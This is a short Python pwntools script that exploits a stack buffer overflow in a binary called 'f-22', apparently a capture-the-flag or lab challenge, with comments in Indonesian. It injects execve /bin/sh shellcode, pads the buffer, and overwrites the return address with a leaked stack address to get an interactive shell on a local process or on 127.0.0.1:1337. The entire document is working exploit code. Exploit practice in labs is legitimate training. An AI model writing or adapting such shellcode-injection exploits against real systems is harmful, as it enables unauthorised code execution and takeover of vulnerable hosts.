#!/usr/bin/python
from pwn import *
import re
import sys

host = '127.0.0.1'
port = 1337

def exploit (r):
	# Pembuatan senjata
	shellcode =  '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0'
	shellcode += '\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f'
	shellcode += '\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
	junk = 'A' * (0x50 - len (shellcode))
	padding = 'B' * 8

	# Menampung alamat input kita
	temp = r.recvuntil ('\nN')
	temp = re.search (r'0x[a-f0-9]+', temp).group ()
	input = p64 (int (temp, 16))

	# Tahap exploit
	payload = shellcode + junk + padding + input
	r.recvuntil (': ')
	r.sendline (payload)
	r.interactive ()
	r.close ()

if __name__ == '__main__':
	bin = ELF ('./f-22')

	if len (sys.argv) > 1:
		r = remote (host, port)
		exploit (r)
	else:
		r = process ('./f-22')
		exploit (r)
